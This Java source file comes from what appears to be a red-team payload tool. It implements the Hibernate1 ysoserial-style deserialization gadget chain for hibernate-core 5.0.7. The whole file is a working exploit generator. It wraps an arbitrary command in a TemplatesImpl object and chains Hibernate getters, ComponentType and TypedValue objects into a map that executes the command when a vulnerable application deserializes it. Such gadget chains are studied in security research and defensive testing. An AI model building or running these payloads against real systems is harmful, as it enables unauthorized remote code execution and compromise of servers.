package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

@Authors({Authors.MBECHLER})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({
        "org.hibernate:hibernate-core:5.0.7.Final",
        "org.hibernate.javax.persistence:hibernate-jpa-2.1-api:1.0.0.Final",
        "org.jboss.logging:jboss-logging:3.3.0.Final",
        "org.apache.geronimo.specs:geronimo-jta_1.1_spec:1.1.1"
})
public class Hibernate1 implements ObjectPayload<Object> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public static Object makeGetter(Class<?> tplClass, String method)
            throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Class<?> getterInterface = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> constructor = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object getter = constructor.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object array = Array.newInstance(getterInterface, 1);
        Array.set(array, 0, getter);
        return array;
    }

    @Override
    public Object getObject(String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        Object getters = makeGetter(templates.getClass(), "getOutputProperties");
        return makeCaller(templates, getters);
    }

    static Object makeCaller(Object target, Object getters) throws Exception {
        PojoComponentTuplizer tuplizer = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tuplizer, getters);

        ComponentType componentType = Reflections.createWithConstructor(
                ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(componentType, "componentTuplizer", tuplizer);
        Reflections.setFieldValue(componentType, "propertySpan", 1);
        Reflections.setFieldValue(componentType, "propertyTypes", new Type[]{componentType});

        TypedValue value1 = new TypedValue(componentType, null);
        Reflections.setFieldValue(value1, "value", target);
        Reflections.setFieldValue(value1, "type", componentType);

        TypedValue value2 = new TypedValue(componentType, null);
        Reflections.setFieldValue(value2, "value", target);
        Reflections.setFieldValue(value2, "type", componentType);

        return Gadgets.makeMap(value1, value2);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Hibernate1.class, args);
    }
}
